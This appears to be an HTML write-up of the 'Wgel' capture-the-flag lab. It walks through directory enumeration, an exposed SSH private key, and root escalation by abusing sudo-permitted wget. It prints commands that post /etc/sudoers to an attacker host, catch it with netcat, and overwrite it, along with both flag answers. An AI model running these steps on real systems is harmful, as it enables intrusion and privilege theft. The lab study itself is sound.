<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Wgel CTF</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Wgel CTF</h1><br/><br /><h2>Summary:</h2><br /><br />In this challenge we are presented with an Apache webserver. The landing page is the default Apache page and to gain the initial foothold, we need to enumerate hidden sites multiple times.<br />This allows us to get access to a private SSH key located on the server. Together with a comment that was left in the source code of one of the pages we can log into the server.<br />Once there, a misconfigured sudoers file allows us to use wget as root and escalate our privileges.<br /><br /><br /><br /><strong>User flag:</strong><br /><br />    First we perform a port scan:<br />       <code> sudo nmap -A &lt;IP&gt;</code><br />        <br />    This reveals that port 22 (SSH) and port 80 (HTTP) are open.<br />    <br />    Since there's a webserver running on the system we connect to its IP via the browser.<br />    We are greeted by the Apache default page.<br />    <br />    So, next we try to find any hidden directories on this server using Gobuster:<br />         <code>gobuster dir -u 10.10.80.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code><br />         <br />    We can see that a website, that appears to be a business website, is hidden behind /sitemap.<br /><br />    After running another Gobuster scan against this site using the dirb/common.txt wordlist more interesting subdirectories are revealed:<br />    <br />    <img src="images/113-1.png" alt="images/113-1.png" />  <br />    <br />    In fact, going to /.ssh allows you to access  an RSA private key, which based on the name of the directory is probably the private SSH key to the server.  <br />    <br />    After downloading this file and using ssh2john.py to try and crack the password the script reveals that there is no password to crack.<br />    <br />    Now, all we have to do to log in is to find the corresponding username. Usernames such as ‘admin’, ‘wp_admin’ and ‘unapp’ didn't work. After a bit more digging it turns out that there's a comment left in the source code of the original landing page:<br />         “&lt;!-- Jessie don't forget to udate the webiste --&gt;”<br />         <br />    Bingo! Now we can log in with the private key and the ‘jessie’ as the username.<br />     <br />    After logging in, we can find the ‘user_flag.txt’ file in jessie's ~/Documents folder.<br />     <br />     <br /><strong>    Answer:  057c67131c3d5e42dd5cd3075b198ff6</strong><br />    <br />    <br />    <br /><strong>Root flag:</strong><br /><br />    After successfully logging in we can first check what we can do on the system by using:<br />        <code>sudo -l</code><br />    <br />    We notice that we can execute wget as root without requireing a password.<br />    This means that we can download files onto the system and overwrite whatever file we want in the process.<br />    <br />    I opted to overwrite the /etc/sudoers file and to give jessie access too everything without needing a password:<br />    <br />        <code>sudo wget  --post-file=/etc/sudoers &lt;attacker IP&gt;</code><br />        <br />    We can then catch that file using netcat:<br />        <code>sudo nc -lvp 80 &gt; sudoers</code><br />        <br />    And then edit it with visudo to change<br />        <code>jessie	ALL=(root) NOPASSWD: /bin/wget</code><br />    to<br />        <code>jessie	ALL=(root) NOPASSWD: ALL</code><br />        <br />    Afterwards we can spin up a Python server to upload the file again:<br />        <code>python3 -m http.server 8080</code><br />        <br />    Afterwards we just need to go back to the victim's box and overwrite /etc/sudoers as follows:<br />        <code>sudo wget -O /etc/sudoers &lt;IP:PORT/FILE&gt;</code><br />        <br />    We can then check our new permissions using<br />        <code>sudo -l</code><br />    and we notice that we can now execute all commands as root without requireing a password.<br />    <br />    So, to become root we execute the following command:<br />        <code>sudo su</code><br />        <br />    Now we can read the contents of /root/root_flag.txt<br />    <br />    <br />  <strong>  Answer: b1b968b37519ad1daa6408188649263d</strong><br />     </div></body></html>